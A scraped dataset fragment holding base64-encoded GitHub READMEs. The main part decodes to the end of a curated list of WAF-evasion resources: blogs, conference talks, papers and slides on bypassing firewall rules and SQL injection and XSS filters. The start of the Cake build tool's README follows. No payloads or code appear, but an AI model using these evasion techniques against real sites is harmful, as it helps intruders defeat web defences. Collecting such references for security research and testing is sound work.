dXNjYXRlIHBheWxvYWRzIHdoaWNoIG1pZ2h0IGV2YWRlIHNvbWUgV0FGcy4K
LSBbQnlwYXNzIFdBRiBCdXJwU3VpdGUgUGx1Z2luXShodHRwczovL3BvcnRz
d2lnZ2VyLm5ldC9iYXBwc3RvcmUvYWUyNjExZGEzYmJjNDY4Nzk1M2ExZjRi
YTZhNGUwNGMpIC0gQSBwbHVnaW4gZm9yIEJ1cnAgU3VpdGUgd2hpY2ggYWRk
cyBzb21lIHJlcXVlc3QgaGVhZGVycyBzbyB0aGF0IHRoZSByZXF1ZXN0cyBz
ZWVtIGZyb20gdGhlIGludGVybmFsIG5ldHdvcmsuCgojIyBCbG9ncyBhbmQg
V3JpdGV1cHMKLSBbV2ViIEFwcGxpY2F0aW9uIEZpcmV3YWxsIChXQUYpIEV2
YXNpb24gVGVjaG5pcXVlcyAjMV0oaHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1
aWNlL3dhZi1ldmFzaW9uLXRlY2huaXF1ZXMtNzE4MDI2ZDY5M2Q4KSAtIEJ5
IFtAU2VjanVpY2VdKGh0dHBzOi8vd3d3LnNlY2p1aWNlLmNvbSkuCi0gW1dl
YiBBcHBsaWNhdGlvbiBGaXJld2FsbCAoV0FGKSBFdmFzaW9uIFRlY2huaXF1
ZXMgIzJdKGh0dHBzOi8vbWVkaXVtLmNvbS9zZWNqdWljZS93ZWItYXBwbGlj
YXRpb24tZmlyZXdhbGwtd2FmLWV2YXNpb24tdGVjaG5pcXVlcy0yLTEyNTk5
NWYzZTdiMCkgLSBCeSBbQFNlY2p1aWNlXShodHRwczovL3d3dy5zZWNqdWlj
ZS5jb20pLgotIFtXZWIgQXBwbGljYXRpb24gRmlyZXdhbGwgKFdBRikgRXZh
c2lvbiBUZWNobmlxdWVzICMzXShodHRwczovL3d3dy5zZWNqdWljZS5jb20v
d2ViLWFwcGxpY2F0aW9uLWZpcmV3YWxsLXdhZi1ldmFzaW9uLykgLSBCeSBb
QFNlY2p1aWNlXShodHRwczovL3d3dy5zZWNqdWljZS5jb20pLgotIFtIb3cg
VG8gRXhwbG9pdCBQSFAgUmVtb3RlbHkgVG8gQnlwYXNzIEZpbHRlcnMgJiBX
QUYgUnVsZXNdKGh0dHBzOi8vd3d3LnNlY2p1aWNlLmNvbS9waHAtcmNlLWJ5
cGFzcy1maWx0ZXJzLXNhbml0aXphdGlvbi13YWYvKS0gQnkgW0BTZWNqdWlj
ZV0oaHR0cHM6Ly9zZWNqdWljZS5jb20pCi0gW01vZFNlY3VyaXR5IFNRTCBJ
bmplY3Rpb24gQ2hhbGxlbmdlOiBMZXNzb25zIExlYXJuZWRdKGh0dHBzOi8v
d3d3LnRydXN0d2F2ZS5jb20vZW4tdXMvcmVzb3VyY2VzL2Jsb2dzL3NwaWRl
cmxhYnMtYmxvZy9tb2RzZWN1cml0eS1zcWwtaW5qZWN0aW9uLWNoYWxsZW5n
ZS1sZXNzb25zLWxlYXJuZWQvKSAtIEJ5IFtAU3BpZGVyTGFic10oaHR0cHM6
Ly90cnVzdHdhdmUuY29tKS4KLSBbWFhFIHRoYXQgY2FuIEJ5cGFzcyBXQUZd
KGh0dHBzOi8vbGFiLndhbGxhcm0uY29tL3h4ZS10aGF0LWNhbi1ieXBhc3Mt
d2FmLXByb3RlY3Rpb24tOThmNjc5NDUyY2UwKSAtIEJ5IFtAV2FsbEFybV0o
aHR0cHM6Ly9sYWJzLndhbGxhcm0uY29tKS4KLSBbU1FMIEluamVjdGlvbiBC
eXBhc3NpbmcgV0FGXShodHRwczovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhw
L1NRTF9JbmplY3Rpb25fQnlwYXNzaW5nX1dBRikgLSBCeSBbQE9XQVNQXSho
dHRwczovL293YXNwLmNvbSkuCi0gW0hvdyBUbyBSZXZlcnNlIEVuZ2luZWVy
IEEgV2ViIEFwcGxpY2F0aW9uIEZpcmV3YWxsIFVzaW5nIFJlZ3VsYXIgRXhw
cmVzc2lvbiBSZXZlcnNpbmddKGh0dHBzOi8vd3d3LnN1bm55aG9pLmNvbS9y
ZXZlcnNlLWVuZ2luZWVyLXdlYi1hcHBsaWNhdGlvbi1maXJld2FsbC11c2lu
Zy1yZWd1bGFyLWV4cHJlc3Npb24tcmV2ZXJzaW5nLykgLSBCeSBbQFN1bm55
SG9pXShodHRwczovL3R3aXR0ZXIuY29tL3N1bm55aG9pKS4KLSBbQnlwYXNz
aW5nIFdlYi1BcHBsaWNhdGlvbiBGaXJld2FsbHMgYnkgYWJ1c2luZyBTU0wv
VExTXShodHRwczovLzB4MDlhbC5naXRodWIuaW8vd2FmL2J5cGFzcy9zc2wv
MjAxOC8wNy8wMi93ZWItYXBwbGljYXRpb24tZmlyZXdhbGwtYnlwYXNzLmh0
bWwpIC0gQnkgW0AweDA5QUxdKGh0dHBzOi8vdHdpdHRlci5jb20vMHgwOWFs
KS4KLSBbUmVxdWVzdCBFbmNvZGluZyB0byBCeXBhc3MgV0FGc10oaHR0cHM6
Ly93d3cubmNjZ3JvdXAudHJ1c3QvdWsvYWJvdXQtdXMvbmV3c3Jvb20tYW5k
LWV2ZW50cy9ibG9ncy8yMDE3L2F1Z3VzdC9yZXF1ZXN0LWVuY29kaW5nLXRv
LWJ5cGFzcy13ZWItYXBwbGljYXRpb24tZmlyZXdhbGxzLykgLSBCeSBbQFNv
cm91c2ggRGFsaWxpXShodHRwczovL3R3aXR0ZXIuY29tL2lyc2RsKQoKIyMg
VmlkZW8gUHJlc2VudGF0aW9ucwotIFtXQUYgQnlwYXNzIFRlY2huaXF1ZXMg
VXNpbmcgSFRUUCBTdGFuZGFyZCBhbmQgV2ViIFNlcnZlcnMgQmVoYXZpb3Jd
KGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3dhdGNoP3Y9dFNmX0lYZnV6WGsp
IGZyb20gW0BPV0FTUF0oaHR0cHM6Ly9vd2FzcC5vcmcpLgotIFtDb25mZXNz
aW9ucyBvZiBhIFdBRiBEZXZlbG9wZXI6IFByb3RvY29sLUxldmVsIEV2YXNp
b24gb2YgV2ViIEFwcCBGaXJld2FsbHNdKGh0dHBzOi8vd3d3LnlvdXR1YmUu
Y29tL3dhdGNoP3Y9UFZWRzRyQ0ZaR1UpIGZyb20gW0JsYWNrSGF0IFVTQSAx
Ml0oaHR0cHM6Ly9ibGFja2hhdC5jb20vaHRtbC9iaC11cy0xMikuCi0gW1dl
YiBBcHBsaWNhdGlvbiBGaXJld2FsbCAtIEFuYWx5c2lzIG9mIERldGVjdGlv
biBMb2dpY10oaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kTUZK
TGljZGFDMCkgZnJvbSBbQmxhY2tIYXRdKGh0dHBzOi8vYmxhY2toYXQuY29t
KS4KLSBbQnlwYXNzaW5nIEJyb3dzZXIgU2VjdXJpdHkgUG9saWNpZXMgZm9y
IEZ1biAmIFByb2ZpdF0oaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/
dj1QNVI0S2VDek8tUSkgZnJvbSBbQmxhY2tIYXRdKGh0dHBzOi8vYmxhY2to
YXQuY29tKS4KLSBbV2ViIEFwcGxpY2F0aW9uIEZpcmV3YWxsIEJ5cGFzc2lu
Z10oaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1TRDdGb3Jyd1VN
WSkgZnJvbSBbUG9zaXRpdmUgVGVjaG5vbG9naWVzXShodHRwczovL3B0c2Vj
dXJpdHkuY29tKS4KLSBbRmluZ2VycHJpbnRpbmcgRmlsdGVyIFJ1bGVzIG9m
IFdlYiBBcHBsaWNhdGlvbiBGaXJld2FsbHMgLSBTaWRlIENoYW5uZWxpbmcg
QXR0YWNrc10oaHR0cHM6Ly93d3cudXNlbml4Lm9yZy9jb25mZXJlbmNlL3dv
b3QxMi93b3Jrc2hvcC1wcm9ncmFtL3ByZXNlbnRhdGlvbi9zY2htaXR0KSBm
cm9tIFtAVXNlTml4XShodHRwczovL3d3dy51c2VuaXguY29tKS4KLSBbRXZh
ZGluZyBEZWVwIEluc3BlY3Rpb24gU3lzdGVtcyBmb3IgRnVuIGFuZCBTaGVs
bF0oaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Ca21QWmhnTG1S
bykgZnJvbSBbQmxhY2tIYXQgVVMgMTNdKGh0dHBzOi8vYmxhY2toYXQuY29t
L2h0bWwvYmgtdXMtMTMpLgotIFtCeXBhc3MgT1dBU1AgQ1JTICYmIENXQUYg
KFdBRiBSdWxlIFRlc3RpbmcgLSBVbnJlc3RyaWN0ZWQgRmlsZSBVcGxvYWQp
XShodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PWxXb3hBanZnaUhz
KSBmcm9tIFtGb29scyBvZiBTZWN1cml0eV0oaHR0cHM6Ly93d3cueW91dHVi
ZS5jb20vY2hhbm5lbC9VQ0VCSE8wa0QxV0Z2SWhmOXdCQ1UtVlEpLgotIFtX
QUZzIEZUVyEgQSBtb2Rlcm4gZGV2b3BzIGFwcHJvYWNoIHRvIHNlY3VyaXR5
IHRlc3RpbmcgeW91ciBXQUZdKGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3dh
dGNoP3Y9MDVVeTBSN1VkRncpIGZyb20gW0FwcFNlYyBVU0EgMTddKGh0dHBz
Oi8vd3d3LnlvdXR1YmUuY29tL3VzZXIvT1dBU1BHTE9CQUwpLgotIFtXZWIg
QXBwbGljYXRpb24gRmlyZXdhbGwgQnlwYXNzaW5nIFdvcmtTaG9wXShodHRw
czovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PXpmQlQ3S2M1N3hzKSBmcm9t
IFtPV0FTUF0oaHR0cHM6Ly9vd2FzcC5jb20pLgotIFtCeXBhc3NpbmcgTW9k
ZXJuIFdBRidzIEV4ZW1wbGlmaWVkIEF0IFhTUyBieSBSYWZheSBCYWxvY2hd
KGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3dhdGNoP3Y9ZFdMcHctN19wYTgp
IGZyb20gW1JhZmF5IEJsb2NoXShodHRwOi8vcmFmYXliYWxvY2guY29tKS4K
LSBbV1RGIC0gV0FGIFRlc3RpbmcgRnJhbWV3b3JrXShodHRwczovL3d3dy55
b3V0dWJlLmNvbS93YXRjaD92PWl4Yi1MNUpXSmdJKSBmcm9tIFtBcHBTZWNV
U0EgMTNdKGh0dHBzOi8vb3dhc3Aub3JnKS4KLSBbVGhlIERlYXRoIG9mIGEg
V2ViIEFwcCBGaXJld2FsbF0oaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0
Y2g/dj1tQl94R1NObThaMCkgZnJvbSBbQnJpYW4gTWNIZW5yeV0oaHR0cHM6
Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ3h6cy1OMnNIblhGd2kwWGpE
SU1UUGcpLgotIFtBZHZlbnR1cmVzIHdpdGggdGhlIFdBRl0oaHR0cHM6Ly93
d3cueW91dHViZS5jb20vd2F0Y2g/dj1yZHdCX3AwS1pYTSkgZnJvbSBbQlNp
ZGVzIE1hbmNoZXN0ZXJdKGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL2NoYW5u
ZWwvVUMxbUxpaW1PVHFaRks5OFZ3TThLZTR3KS4KLSBbQnlwYXNzaW5nIElu
dHJ1c2lvbiBEZXRlY3Rpb24gU3lzdGVtc10oaHR0cHM6Ly93d3cueW91dHVi
ZS5jb20vd2F0Y2g/dj1jSjNMaFFYenJYdykgZnJvbSBbQmxhY2tIYXRdKGh0
dHBzOi8vYmxhY2toYXQuY29tKS4KLSBbQnVpbGRpbmcgWW91ciBPd24gV0FG
IGFzIGEgU2VydmljZSBhbmQgRm9yZ2V0dGluZyBhYm91dCBGYWxzZSBQb3Np
dGl2ZXNdKGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3dhdGNoP3Y9ZGdxVWNI
cHJvbGMpIGZyb20gW0F1c2NlcnRdKGh0dHBzOi8vY29uZmVyZW5jZS5hdXNj
ZXJ0Lm9yZy5hdSkuCgojIyBQcmVzZW50YXRpb25zICYgUmVzZWFyY2ggUGFw
ZXJzCiMjIyBSZXNlYXJjaCBQYXBlcnM6Ci0gW1Byb3RvY29sIExldmVsIFdB
RiBFdmFzaW9uXShwYXBlcnMvUXVhbHlzJTIwR3VpZGUlMjAtJTIwUHJvdG9j
b2wtTGV2ZWwlMjBXQUYlMjBFdmFzaW9uLnBkZikgLSBBIHByb3RvY29sIGxl
dmVsIFdBRiBldmFzaW9uIHRlY2huaXF1ZXMgYW5kIGFuYWx5c2lzIGJ5IFtR
dWFseXNdKGh0dHBzOi8vd3d3LnF1YWx5cy5jb20pLgotIFtOZXVyYWwgTmV0
d29yayBiYXNlZCBXQUYgZm9yIFNRTGldKHBhcGVycy9BcnRpZmljaWFsJTIw
TmV1cmFsJTIwTmV0d29yayUyMGJhc2VkJTIwV0FGJTIwZm9yJTIwU1FMJTIw
SW5qZWN0aW9uLnBkZikgLSBBIHBhcGVyIGFib3V0IGJ1aWxkaW5nIGEgbmV1
cmFsIG5ldHdvcmsgYmFzZWQgV0FGIGZvciBkZXRlY3RpbmcgU1FMaSBhdHRh
Y2tzLgotIFtCeXBhc3NpbmcgV2ViIEFwcGxpY2F0aW9uIEZpcmV3YWxscyB3
aXRoIEhUVFAgUGFyYW1ldGVyIFBvbGx1dGlvbl0ocGFwZXJzL0J5cGFzc2lu
ZyUyMFdlYiUyMEFwcGxpY2F0aW9uJTIwRmlyZXdhbGxzJTIwd2l0aCUyMEhU
VFAlMjBQYXJhbWV0ZXIlMjBQb2xsdXRpb24ucGRmKSAtIEEgcmVzZWFyY2gg
cGFwZXIgZnJvbSBbRXhwbG9pdCBEQl0oaHR0cHM6Ly9leHBsb2l0LWRiLmNv
bSkgYWJvdXQgZWZmZWN0aXZlbHkgYnlwYXNzaW5nIFdBRnMgdmlhIEhUVFAg
UGFyYW1ldGVyIFBvbGx1dGlvbi4KLSBbUG9raW5nIEEgSG9sZSBpbiB0aGUg
RmlyZXdhbGxdKHBhcGVycy9Qb2tpbmclMjBBJTIwSG9sZSUyMEluJTIwVGhl
JTIwRmlyZXdhbGwucGRmKSAtIEEgcGFwZXIgYnkgW1JhZmF5IEJhbG9jaF0o
aHR0cHM6Ly93d3cucmFmYXliYWxvY2guY29tKSBhYm91dCBtb2Rlcm4gZmly
ZXdhbGwgYW5hbHlzaXMuCi0gW01vZGVybiBXQUYgRmluZ2VycHJpbnRpbmcg
YW5kIFhTUyBGaWx0ZXIgQnlwYXNzXShwYXBlcnMvTW9kZXJuJTIwV0FGJTIw
RmluZ2VycHJpbnRpbmclMjBhbmQlMjBYU1MlMjBGaWx0ZXIlMjBCeXBhc3Mu
cGRmKSAtIEEgcGFwZXIgYnkgW1JhZmF5IEJhbG9jaF0oaHR0cHM6Ly93d3cu
cmFmYXliYWxvY2guY29tKSBhYm91dCBXQUYgZmluZ2VycHJpbnRpbmcgYW5k
IGJ5cGFzc2luZyBYU1MgZmlsdGVycy4KLSBbV0FGIEV2YXNpb24gVGVzdGlu
Z10ocGFwZXJzL1NBTlMlMjBHdWlkZSUyMC0lMjBXQUYlMjBFdmFzaW9uJTIw
VGVzdGluZy5wZGYpIC0gQSBXQUYgZXZhc2lvbiB0ZXN0aW5nIGd1aWRlIGZy
b20gW1NBTlNdKGh0dHBzOi8vd3d3LnNhbnMub3JnKS4KLSBbU2lkZSBDaGFu
bmVsIEF0dGFja3MgZm9yIEZpbmdlcnByaW50aW5nIFdBRiBGaWx0ZXIgUnVs
ZXNdKHBhcGVycy9TaWRlJTIwQ2hhbm5lbCUyMChUaW1pbmcpJTIwQXR0YWNr
cyUyMGZvciUyMEZpbmdlcnByaW50aW5nJTIwV0FGJTIwUnVsZXMucGRmKSAt
IEEgcGFwZXIgYWJvdXQgaG93IHNpZGUgY2hhbm5lbCBhdHRhY2tzIGNhbiBi
ZSB1dGlsaXNlZCB0byBmaW5nZXJwcmludCBmaXJld2FsbCBmaWx0ZXIgcnVs
ZXMgZnJvbSBbVXNlTml4IFdvb3QnMTJdKGh0dHBzOi8vd3d3LnVzZW5peC5v
cmcvY29uZmVyZW5jZS93b290MTIpLgotIFtXQVNDIFdBRiBFdmFsdWF0aW9u
IENyaXRlcmlhXShwYXBlcnMvV0FTQyUyMFdBRiUyMEV2YWx1YXRpb24lMjBD
cml0ZXJpYS5wZGYpIC0gQSBndWlkZSBmb3IgV0FGIEV2YWx1YXRpb24gZnJv
bSBbV2ViIEFwcGxpY2F0aW9uIFNlY3VyaXR5IENvbnNvcnRpdW1dKGh0dHA6
Ly93d3cud2ViYXBwc2VjLm9yZykuCi0gW1dBRiBFdmFsdWF0aW9uIGFuZCBB
bmFseXNpc10ocGFwZXJzL1dlYiUyMEFwcGxpY2F0aW9uJTIwRmlyZXdhbGxz
JTIwLSUyMEV2YWx1YXRpb24lMjBhbmQlMjBBbmFseXNpcy5wZGYpIC0gQSBw
YXBlciBhYm91dCBXQUYgZXZhbHVhdGlvbiBhbmQgYW5hbHlzaXMgb2YgMiBt
b3N0IHVzZWQgV0FGcyAoTW9kU2VjdXJpdHkgJiBXZWJLbmlnaHQpIGZyb20g
W1VuaXZlcnNpdHkgb2YgQW1zdGVyZGFtXShodHRwOi8vd3d3LnV2YS5ubCku
Ci0gW0J5cGFzc2luZyBhbGwgV0FGIFhTUyBGaWx0ZXJzXShwYXBlcnMvRXZh
ZGluZyUyMEFsbCUyMFdlYi1BcHBsaWNhdGlvbiUyMEZpcmV3YWxscyUyMFhT
UyUyMEZpbHRlcnMucGRmKSAtIEEgcGFwZXIgYWJvdXQgYnlwYXNzaW5nIGFs
bCBYU1MgZmlsdGVyIHJ1bGVzIGFuZCBldmFkaW5nIFdBRnMgZm9yIFhTUy4K
LSBbQmV5b25kIFNRTGkgLSBPYmZ1c2NhdGUgYW5kIEJ5cGFzcyBXQUZzXShw
YXBlcnMvQmV5b25kJTIwU1FMaSUyMC0lMjBPYmZ1c2NhdGUlMjBhbmQlMjBC
eXBhc3MlMjBXQUZzLnR4dCkgLSBBIHJlc2VhcmNoIHBhcGVyIGZyb20gW0V4
cGxvaXQgRGF0YWJhc2VdKGh0dHBzOi8vZXhwbG9pdC1kYi5jb20pIGFib3V0
IG9iZnVzY2F0aW5nIFNRTCBpbmplY3Rpb24gcXVlcmllcyB0byBlZmZlY3Rp
dmVseSBieXBhc3MgV0FGcy4KLSBbQnlwYXNzaW5nIFdBRiBYU1MgRGV0ZWN0
aW9uIE1lY2hhbmlzbXNdKHBhcGVycy9CeXBhc3NpbmclMjBXQUYlMjBYU1Ml
MjBEZXRlY3Rpb24lMjBNZWNoYW5pc21zLnBkZikgLSBBIHJlc2VhcmNoIHBh
cGVyIGFib3V0IGJ5cGFzc2luZyBYU1MgZGV0ZWN0aW9uIG1lY2hhbmlzbXMg
aW4gV0FGcy4gCgojIyMgUHJlc2VudGF0aW9uczoKLSBbTWV0aG9kcyB0byBC
eXBhc3MgYSBXZWIgQXBwbGljYXRpb24gRmlyZXdhbGxdKHByZXNlbnRyYXRp
b25zL01ldGhvZHMlMjBUbyUyMEJ5cGFzcyUyMEElMjBXZWIlMjBBcHBsaWNh
dGlvbiUyMEZpcmV3YWxsLnBkZikgLSBBIHByZXNlbnRhdGlvbiBmcm9tIFtQ
VCBTZWN1cml0eV0oaHR0cHM6Ly93d3cucHRzZWN1cml0eS5jb20pIGFib3V0
IGJ5cGFzc2luZyBXQUYgZmlsdGVycyBhbmQgZXZhc2lvbi4KLSBbV2ViIEFw
cGxpY2F0aW9uIEZpcmV3YWxsIEJ5cGFzc2luZyAoSG93IHRvIERlZmVhdCB0
aGUgQmx1ZSBUZWFtKV0ocHJlc2VudGF0aW9uL1dlYiUyMEFwcGxpY2F0aW9u
JTIwRmlyZXdhbGwlMjBCeXBhc3NpbmclMjAoSG93JTIwdG8lMjBEZWZlYXQl
MjB0aGUlMjBCbHVlJTIwVGVhbSkucGRmKSAtIEEgcHJlc2VudGF0aW9uIGFi
b3V0IGJ5cGFzc2luZyBXQUYgZmlsdGVyaW5nIGFuZCBydWxlc2V0IGZ1enpp
bmcgZm9yIGV2YXNpb24gYnkgW0BPV0FTUF0oaHR0cHM6Ly9vd2FzcC5vcmcp
LiAKLSBbV0FGIFByb2ZpbGluZyAmIEV2YXNpb24gVGVjaG5pcXVlc10ocHJl
c2VudGF0aW9ucy9PV0FTUCUyMFdBRiUyMFByb2ZpbGluZyUyMCYlMjBFdmFz
aW9uLnBkZikgLSBBIFdBRiB0ZXN0aW5nIGFuZCBldmFzaW9uIGd1aWRlIGZy
b20gW09XQVNQXShodHRwczovL3d3dy5vd2FzcC5vcmcpLgotIFtQcm90b2Nv
bCBMZXZlbCBXQUYgRXZhc2lvbiBUZWNobmlxdWVzXShwcmVzZW50YXRpb25z
L0JsYWNrSGF0JTIwVVMlMjAxMiUyMC0lMjBQcm90b2NvbCUyMExldmVsJTIw
V0FGJTIwRXZhc2lvbiUyMChTbGlkZXMpLnBkZikgLSBBIHByZXNlbnRhdGlv
biBhdCBhYm91dCBlZmZpY2llbnRseSBldmFkaW5nIFdBRnMgYXQgcHJvdG9j
b2wgbGV2ZWwgZnJvbSBbQmxhY2tIYXQgVVMgMTJdKGh0dHBzOi8vd3d3LmJs
YWNraGF0LmNvbS9odG1sL2JoLXVzLTEyLykuCi0gW0FuYWx5c2luZyBBdHRh
Y2tpbmcgRGV0ZWN0aW9uIExvZ2ljIE1lY2hhbmlzbXNdKHByZXNlbnRhdGlv
bnMvQmxhY2tIYXQlMjBVUyUyMDE2JTIwLSUyMEFuYWx5c2lzJTIwb2YlMjBB
dHRhY2slMjBEZXRlY3Rpb24lMjBMb2dpYy5wZGYpIC0gQSBwcmVzZW50YXRp
b24gYWJvdXQgV0FGIGxvZ2ljIGFwcGxpZWQgdG8gZGV0ZWN0aW5nIGF0dGFj
a3MgZnJvbSBbQmxhY2tIYXQgVVMgMTZdKGh0dHBzOi8vd3d3LmJsYWNraGF0
LmNvbS9odG1sL2JoLXVzLTE2LykuCi0gW1dBRiBCeXBhc3NlcyBhbmQgUEhQ
IEV4cGxvaXRzXShwcmVzZW50YXRpb25zL1dBRiUyMEJ5cGFzc2VzJTIwYW5k
JTIwUEhQJTIwRXhwbG9pdHMlMjAoU2xpZGVzKS5wZGYpIC0gQSBwcmVzZW50
YXRpb24gYWJvdXQgZXZhZGluZyBXQUZzIGFuZCBkZXZlbG9waW5nIHJlbGF0
ZWQgUEhQIGV4cGxvaXRzLgotIFtTaWRlIENoYW5uZWwgQXR0YWNrcyBmb3Ig
RmluZ2VycHJpbnRpbmcgV0FGIEZpbHRlciBSdWxlc10ocHJlc2VudGF0aW9u
cy9TaWRlJTIwQ2hhbm5lbCUyMEF0dGFja3MlMjBmb3IlMjBGaW5nZXJwcmlu
dGluZyUyMFdBRiUyMEZpbHRlciUyMFJ1bGVzLnBkZikgLSBBIHByZXNlbnRh
dGlvbiBhYm91dCBob3cgc2lkZSBjaGFubmVsIGF0dGFja3MgY2FuIGJlIHV0
aWxpc2VkIHRvIGZpbmdlcnByaW50IGZpcmV3YWxsIGZpbHRlciBydWxlcyBm
cm9tIFtVc2VOaXggV29vdCcxMl0oaHR0cHM6Ly93d3cudXNlbml4Lm9yZy9j
b25mZXJlbmNlL3dvb3QxMikuCi0gW091ciBGYXZvcml0ZSBYU1MgRmlsdGVy
cy9JRFMgYW5kIGhvdyB0byBBdHRhY2sgVGhlbV0ocHJlc2VudGF0aW9ucy9P
dXIlMjBGYXZvdXJpdGUlMjBYU1MlMjBXQUYlMjBGaWx0ZXJzJTIwQW5kJTIw
SG93JTIwVG8lMjBCeXBhc3MlMjBUaGVtLnBkZikgLSBBIHByZXNlbnRhdGlv
biBhYm91dCBob3cgdG8gZXZhZGUgWFNTIGZpbHRlcnMgc2V0IGJ5IFdBRiBy
dWxlcyBmcm9tIFtCbGFja0hhdCBVU0EgMDldKGh0dHBzOi8vd3d3LmJsYWNr
aGF0LmNvbS9odG1sL2JoLXVzLTA5LykuCi0gW1BsYXlpbmcgQXJvdW5kIHdp
dGggV0FGc10ocHJlc2VudGF0aW9ucy9QbGF5aW5nJTIwQXJvdW5kJTIwd2l0
aCUyMFdBRnMucGRmKSAtIEEgc21hbGwgcHJlc2VudGF0aW9uIGFib3V0IFdB
RiBwcm9maWxpbmcgYW5kIHBsYXlpbmcgYXJvdW5kIHdpdGggdGhlbSBmcm9t
IFtEZWZjb24gMTZdKGh0dHA6Ly93d3cuZGVmY29uLm9yZy9odG1sL2RlZmNv
bi0xNi9kYy0xNi1wb3N0Lmh0bWwpLgotIFtBIEZvcmdvdHRlbiBIVFRQIElu
dmlzaWJsaXR5IENsb2FrXShwcmVzZW50YXRpb24vQSUyMEZvcmdvdHRlbiUy
MEhUVFAlMjBJbnZpc2liaWxpdHklMjBDbG9hay5wZGYpIC0gQSBwcmVzZW50
YXRpb24gYWJvdXQgdGVjaG5pcXVlcyB0aGF0IGNhbiBiZSB1c2VkIHRvIGJ5
cGFzcyBjb21tb24gV0FGcyBmcm9tIFtCU2lkZXMgTWFuY2hlc3Rlcl0oaHR0
cHM6Ly93d3cuYnNpZGVzbWNyLm9yZy51ay8pLgotIFtCdWlsZGluZyBZb3Vy
IE93biBXQUYgYXMgYSBTZXJ2aWNlIGFuZCBGb3JnZXR0aW5nIGFib3V0IEZh
bHNlIFBvc2l0aXZlc10ocHJlc2VudGF0aW9ucy9CdWlsZGluZyUyMFlvdXIl
MjBPd24lMjBXQUYlMjBhcyUyMGElMjBTZXJ2aWNlJTIwYW5kJTIwRm9yZ2V0
dGluZyUyMGFib3V0JTIwRmFsc2UlMjBQb3NpdGl2ZXMucGRmKSAtIEEgcHJl
c2VudGF0aW9uIGFib3V0IGhvdyB0byBidWlsZCBhIGh5YnJpZCBtb2RlIHdh
ZiB0aGF0IGNhbiB3b3JrIGJvdGggaW4gYW4gb3V0LW9mLWJhbmQgbWFubmVy
IGFzIHdlbGwgYXMgaW5saW5lIHRvIHJlZHVjZSBmYWxzZSBwb3NpdGl2ZXMg
YW5kIGxhdGVuY3kgW0F1c2NlcnQyMDE5XShodHRwczovL2NvbmZlcmVuY2Uu
YXVzY2VydC5vcmcuYXUvKS4KCiMjIENyZWRpdHMgJiBMaWNlbnNlOgpUaGlz
IHdvcmsgaGFzIGJlZW4gcHJlc2VudGVkIGJ5IFtJbmZlY3RlZCBEcmFrZV0o
aHR0cHM6Ly90d2l0dGVyLmNvbS8weEluZmVjdGlvbikgWygweEluZmVjdGlv
bildKGh0dHBzOi8vZ2l0aHViLmNvbS8weGluZmVjdGlvbikgYW5kIGlzIGxp
Y2Vuc2VkIHVuZGVyIHRoZSBbQXBhY2hlIDIuMCBMaWNlbnNlXShMSUNFTlNF
KS4gCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'cake',20094029,b'Cake (C# Make) is a cross platform build automation system.',b'C#',340,2382,,2382,False,b'https://api.github.com/repos/cake-build/cake/forks',"77u/IyBDYWtlCgpbIVtOdUdldF0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9u
dWdldC92L0Nha2Uuc3ZnKV0oaHR0cHM6Ly93d3cubnVnZXQub3JnL3BhY2th
Z2VzL0Nha2UpIFshW0F6dXJlIEFydGlmYWN0c10oaHR0cHM6Ly9henBrZ3Nz
aGllbGQuYXp1cmV2b29kb28ubmV0L2Nha2UtYnVpbGQvQ2FrZS9jYWtlL2Nh
a2UpXShodHRwczovL2Rldi5henVyZS5jb20vY2FrZS1idWlsZC9DYWtlL19w
YWNrYWdpbmc/X2E9cGFja2FnZSZmZWVkPWNha2UmcGFja2FnZT1DYWtlJnBy
b3RvY29sVHlwZT1OdUdldCkgWyFbQ2hvY29sYXRleV0oaHR0cHM6Ly9pbWcu
c2hpZWxkcy5pby9jaG9jb2xhdGV5L3YvQ2FrZS5wb3J0YWJsZS5zdmcpXSho
dHRwczovL2Nob2NvbGF0ZXkub3JnL3BhY2thZ2VzL2Nha2UucG9ydGFibGUp
ClshW2hvbWVicmV3XShodHRwczovL2ltZy5zaGllbGRzLmlvL2hvbWVicmV3
L3YvY2FrZS5zdmcpXShodHRwOi8vYnJhdW1laXN0ZXIub3JnL2Zvcm11bGEv
Y2FrZSkKWyFbSGVscCBDb250cmlidXRlIHRvIE9wZW4gU291cmNlXShodHRw
czovL3d3dy5jb2RldHJpYWdlLmNvbS9jYWtlLWJ1aWxkL2Nha2UvYmFkZ2Vz
L3VzZXJzLnN2ZyldKGh0dHBzOi8vd3d3LmNvZGV0cmlhZ2UuY29tL2Nha2Ut
YnVpbGQvY2FrZSkKClshW1NvdXJjZSBCcm93c2VyXShodHRwczovL2ltZy5z
aGllbGRzLmlvL2JhZGdlL0Jyb3dzZS1Tb3VyY2UtZ3JlZW4uc3ZnKV0oaHR0
cDovL3NvdXJjZWJyb3dzZXIuaW8vQnJvd3NlL2Nha2UtYnVpbGQvY2FrZSkK
CkNha2UgKEMjIE1ha2UpIGlzIGEgYnVpbGQgYXV0b21hdGlvbiBzeXN0ZW0g
d2l0aCBhIEMjIERTTCB0byBkbyB0aGluZ3MgbGlrZSBjb21waWxpbmcgY29k
ZSwgY29weSBmaWxlcy9mb2xkZXJzLCBydW5uaW5nIHVuaXQgdGVzdHMsIGNv
